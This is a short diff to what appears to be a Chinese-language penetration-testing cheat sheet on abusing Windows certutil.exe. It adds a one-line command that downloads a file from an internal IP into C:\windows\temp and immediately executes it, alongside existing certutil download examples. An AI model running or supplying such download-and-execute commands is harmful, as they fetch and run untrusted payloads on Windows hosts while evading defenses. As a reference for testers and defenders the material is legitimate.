@@ -490,6 +490,10 @@ certutil.exe -urlcache -split -f http://192.168.1.1/1.exe
 certutil.exe -urlcache -split -f http://192.168.1.1/1.txt 1.exe
 ```
 
+```
+certutil.exe -urlcache -split -f http://192.168.6.27:8012/download/f.ext C:\windows\temp\up.exe &&start C:\windows\temp\up.exe
+```
+
 删除缓存
 
 ```
